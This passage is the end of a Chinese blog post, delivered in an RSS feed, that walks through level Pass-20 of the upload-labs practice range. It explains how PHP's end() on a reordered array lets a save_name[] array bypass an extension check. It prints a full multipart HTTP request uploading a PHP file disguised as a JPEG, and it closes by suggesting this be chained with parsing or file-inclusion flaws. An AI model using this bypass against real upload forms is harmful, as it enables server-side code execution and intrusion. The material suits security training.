+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$arr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;0&amp;#34;&lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="s2">&amp;#34;jpg&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;2&amp;#34;&lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="s2">&amp;#34;php&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="s2">&amp;#34;jpg&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">end&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$arr&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$arr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$arr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="s2">&amp;#34;jpg&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="s2">&amp;#34;php&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>我们创建了一个数组，数组顺序不是按照寻常的顺序的，我们故意把最后一个元素排在了前面一位的话，这样&lt;code>end&lt;/code>就取到了&lt;code>jpg&lt;/code>后缀，这样我们就可以利用&lt;code>$_POST[save_name]&lt;/code>来绕过最后后缀检测了&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/Pass-20/index.php?action=show_code&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">localhost:8002&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Referer&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">http://localhost:8002/Pass-20/index.php?action=show_code&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">multipart/form-data; boundary=---------------------------137136829317924008472127919060&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Length&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">617&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">close&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Upgrade-Insecure-Requests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------137136829317924008472127919060
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Disposition: form-data; name=&amp;#34;upload_file&amp;#34;; filename=&amp;#34;info.jpg&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Type: image/gif
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;?php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">phpinfo();
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">?&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------137136829317924008472127919060
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Disposition: form-data; name=&amp;#34;save_name[1]&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">upload-20.php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------137136829317924008472127919060
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Disposition: form-data; name=&amp;#34;save_name[0]&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jpg
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------137136829317924008472127919060
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Disposition: form-data; name=&amp;#34;submit&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">上传
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------137136829317924008472127919060--
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这里需要注意的是，&lt;code>save_name[0]&lt;/code>放&lt;code>jpg&lt;/code>就好了，否则&lt;code>$ext&lt;/code>拿到的是&lt;code>upload-20.jpg&lt;/code>，这样整个字符串就会进入&lt;code>!in_array($ext, $allow_suffix)&lt;/code>这个判断里面了。&lt;/p>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006384.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;h2 id="conclusion">Conclusion
+&lt;/h2>&lt;p>这个靶场还是挺好的，总结得都相当不错。如果能配合更多的中间件解析漏洞来做的话会更棒，因为很多时候我们做到的仅仅是上传一个 jpg 啥的，如果配合解析漏洞或者文件包含，可以进一步扩大杀伤力。&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/c0ny1/upload-labs/master/doc/mind-map.png"
+loading="lazy"
+>&lt;/p></description></item></channel></rss>
